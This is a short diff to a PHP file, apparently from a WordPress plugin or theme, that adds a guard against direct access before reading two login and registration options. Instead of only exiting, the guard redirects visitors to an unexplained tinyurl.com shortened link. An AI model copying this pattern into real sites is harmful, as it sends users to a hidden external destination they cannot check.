@@ -1,6 +1,12 @@
 <?php
 namespace App;
 
+//Protect the file to direct Access wia url
+if ( ! defined( 'ABSPATH' )) {
+    header('Location: http://tinyurl.com/ydek4vj2');
+    exit; // Exit if accessed directly
+}
+
 $activate_custom_login_page = get_option( 'init_custom_login_page_admin');
 $activate_user_register_custom_page = get_option( 'activate_user_register_custom_page');
 
